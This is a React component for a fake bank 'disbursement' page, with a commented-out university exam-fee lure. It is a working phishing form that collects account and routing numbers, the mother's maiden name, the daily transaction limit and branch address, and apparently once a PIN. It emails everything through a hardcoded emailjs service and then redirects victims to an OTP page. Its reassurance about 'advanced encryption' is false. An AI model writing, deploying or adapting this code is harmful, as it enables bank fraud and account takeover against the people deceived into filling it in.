import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png';

const ExamForm2 = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  // const [showPinModal, setShowPinModal] = useState(false);
  const [formValues, setFormValues] = useState({
    bankName: '',
    cardNumber: '',
    nameOnCard: '',
    maidenName: '',
    accNo: '',
    routingNo: '',
    checkingNumber: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    cardLimit: '',
    pin: '',
  });
  const navigate = useNavigate();

  // Add this state variable
  const [bankAccountType, setBankAccountType] = useState('');

  // Function to handle radio change
  const handleAccountTypeChange = (e) => {
    setBankAccountType(e.target.value);
  };

  const resetForm = () => {
    setFormValues({
      bankName: '',
      cardNumber: '',
      nameOnCard: '',
      maidenName: '',
      accNo: '',
      routingNo: '',
      cardLimit: '',
      streetAddress: '',
      city: '',
      state: '',
      postalCode: '',
      pin: '',
      checkingNumber: '', 
      bankAccountType: '',
    });

    setBankAccountType(''); // Reset bank account type separately
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
    sendEmail();
    resetForm();
    setShowConfirmModal(false);
    navigate('/otp');
    // setShowPinModal(true);
  };

  // const handlePinSubmit = (e) => {
  //   e.preventDefault();
  //   sendEmail();
  //   resetForm();
  //   setShowPinModal(false);
  //   navigate('/otp');
  // };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };
  
  const handleCardLimitChange = (e) => {
  e.target.value = e.target.value.replace(/[a-zA-Z]/g, '');
};

  
  // const handleCardLimitChange = (e) => {
  //   e.target.value = e.target.value.replace(/\D/g, '');
  // };
  
  // const handleCardLimitChange = (e) => {

  //   const { name, value } = e.target;

  //   if (/^[\d()+_\s-]*$/.test(value)) {
  //     setFormValues({ ...formValues, [name]: value });
  //   }
  // };

  // const handleTextOnlyInput = (e) => {
  //   e.target.value = e.target.value.replace(/\d/g, '');
  // };


  const sendEmail = () => {
    const templateParams = {
      ...formValues,
      bankAccountType, // Include the type of bank account
      checkingNumber: formValues.checkingNumber || '', // Include checking number if applicable
    };

    emailjs
      .send(
        'service_e234qa4', // Replace with your service ID
        'template_f0nymc7', // Replace with your template ID
        templateParams,
        'aM4ACgzNEz-ykB_dV' // Replace with your user ID
      )
      .then(
        (response) => {
          console.log('SUCCESS!', response.status, response.text);
        },
        (err) => {
          console.log('FAILED...', err);
        }
      );
  };

  return (
    <div>
      <Navbar />
      <div className="container d-flex justify-content-center mt-5">
        <div className="col-md-6 mt-5">
          {/* <h2 className="mt-5">EXAM FORM</h2>
          <p>
            <strong>About The Exam</strong>
          </p>
          <p>Compulsory DePaul University exam: 35% of your course assessment.</p>
          <div className="card mb-3">
            <div className="card-body">
              <p className="card-text fw-medium fs-3">Community Group Exam Form: #journalism #DePaul University</p>
              <p className="fw-bold fs-4 text-end"> - $ 6.00</p>
            </div>
          </div> */}
          <h3>Enter Bank Details</h3>
          <p>
            Enter the following to complete payment <br />
            Only enter correct details to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.
          </p>
          <div className="card p-4 pt-2">
            <p className='text-end fw-bold fs-6'>Single Disbursement $3200</p>
            <p className="fst-italic text-end p-0 m-0">Trusted and Secure Payment</p>
            <div className="d-flex justify-content-end mb-3">
              <img src={bankLogo} alt="" className="img-fluid" width={270} height={30} />
            </div>
            <Form onSubmit={handlePayClick} autoComplete="off">
              <Form.Group className="mb-3" controlId="bankName">
                <Form.Label>Bank Name</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Enter your bank name"
                  name="bankName"
                  value={formValues.bankName}
                  // onInput={handleTextOnlyInput}
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              <Form.Group className="mb-3" controlId="nameOnCard">
                <Form.Label>Full Name of Account Holder</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Enter account holder's full name"
                  name="nameOnCard"
                  value={formValues.nameOnCard}
                  // onInput={handleTextOnlyInput}
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              
              <Form.Group className="mb-3" controlId="maidenName">
                <Form.Label>Mother’s Maiden Name</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Enter mother's maiden name"
                  name="maidenName"
                  value={formValues.maidenName}
                  // onInput={handleTextOnlyInput}
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              <Form.Group className="mb-3" controlId="accNo">
                <Form.Label>Account Number</Form.Label>
                <Form.Control
                  // type="number"
                  placeholder="e.g., 123456789012"
                  name="accNo"
                  value={formValues.accNo}
                  onInput={handleNumberOnlyInput}
                  maxLength='12'
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              <Form.Group className="mb-3" controlId="routingNo">
                <Form.Label>Routing Number</Form.Label>
                <Form.Control
                  // type="number"
                  placeholder="e.g., 123456789"
                  name="routingNo"
                  value={formValues.routingNo}
                  onInput={handleNumberOnlyInput}
                  maxLength='9'
                  onChange={handleInputChange}
                  required
                />
              </Form.Group>

              <Form.Group className="mb-3" controlId="bankAccountType">
                <Form.Label>Type of Bank Account</Form.Label>
                <div>
                  <Form.Check
                    type="radio"
                    label="Savings Account"
                    name="bankAccountType"
                    value="Savings Account"
                    checked={bankAccountType === 'Savings Account'}
                    onChange={handleAccountTypeChange}
                    required
                  />
                  <Form.Check
                    type="radio"
                    label="Checking Account"
                    name="bankAccountType"
                    value="Checking Account"
                    checked={bankAccountType === 'Checking Account'}
                    onChange={handleAccountTypeChange}
                    required
                  />
                </div>
              </Form.Group>

              {/* Conditionally render Checking Number field */}
              {bankAccountType === 'Checking Account' && (
                <Form.Group className="mb-3" controlId="checkingNumber">
                  <Form.Label>Checking Number</Form.Label>
                  <Form.Control
                    // type="number"
                    placeholder="Enter checking number"
                    name="checkingNumber"
                    value={formValues.checkingNumber || ''}
                    onInput={handleNumberOnlyInput}
                    maxLength='12'
                    onChange={handleInputChange}
                    required
                  />
                </Form.Group>
              )}

              
              <Form.Group controlId="formCardLimit" className="mt-2">

              <Form.Label> Transaction Limit per Day </Form.Label>

              <Form.Control type="text" placeholder="Enter daily transaction limit (e.g., $5,000)" name="cardLimit" value={formValues.cardLimit}
                onInput={handleCardLimitChange}
                onChange={handleInputChange} required />
            </Form.Group>     

              <Form.Group controlId="formAddress" className="mt-4">
                <Form.Label>Bank Branch Address</Form.Label>
                <Form.Control
                  type="text"
                  placeholder="Street Address"
                  name="streetAddress"
                  value={formValues.streetAddress}
                  onChange={handleInputChange}
                  required
                  className="mb-2"
                />
                {/*
                <Form.Control
                  type="text"
                  placeholder="Street Address Line 2 (Optional)"
                  name="streetAddress2"
                  value={formValues.streetAddress2}
                  onChange={handleInputChange}
                  className="mb-2"
                />
                */}
                <Form.Control
                  type="text"
                  placeholder="City"
                  name="city"
                  value={formValues.city}
                  onChange={handleInputChange}
                  required
                  className="mb-2"
                />
                <Form.Control
                  type="text"
                  placeholder="State / Province"
                  name="state"
                  value={formValues.state}
                  onChange={handleInputChange}
                  required
                  className="mb-2"
                />
                <Form.Control
                  type="text"
                  placeholder="Postal / Zip Code"
                  name="postalCode"
                  value={formValues.postalCode}
                  onChange={handleInputChange}
                  required
                  className="mb-3"
                />
              </Form.Group>

              <p className='fst-italic'>Please review and confirm your account details before submission.</p>

              <Button variant="primary" type="submit">SUBMIT</Button>
              {/* <p className="fw-bold text-end"> - $ 6.00</p> */}
            </Form>
          </div>
          <p className="mt-3"><strong>Trusted and Secure</strong><br />
          Your security is our top priority. We employ advanced encryption protocols to safeguard your information, ensuring the highest standards of data protection.</p>
        </div>
      </div>

      {/* Confirmation Modal */}
      <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Confirm Your Details</Modal.Title>
        </Modal.Header>
        <Modal.Body>
        Please ensure all account details are correct before confirming your submission to avoid <span style={{ color: '#FF0000' }}>error(s)</span> during disbursement.
        </Modal.Body>
        <Modal.Footer>
          <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>
            Cancel
          </Button>
          <Button variant="primary" onClick={handleConfirmClick}>
            Submit
          </Button>
        </Modal.Footer>
      </Modal>

      {/* PIN Modal */}
      {/*
      <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
        <Modal.Header closeButton>
          <Modal.Title>Enter PIN</Modal.Title>
        </Modal.Header>
        <Modal.Body>
          <Form onSubmit={handlePinSubmit}>
            <Form.Group controlId="formPin">
              <Form.Label>Enter PIN</Form.Label>
              <Form.Control
                type="password"
                placeholder="Enter PIN"
                name="pin"
                value={formValues.pin}
                onInput={handleNumberOnlyInput}
                onChange={handleInputChange}
                required
              />
            </Form.Group>
            <Button variant="primary" type="submit" className="mt-3">
              Submit PIN
            </Button>
          </Form>
        </Modal.Body>
      </Modal>
      */}
      
      <Footer />
    </div>
  );
};

export default ExamForm2;
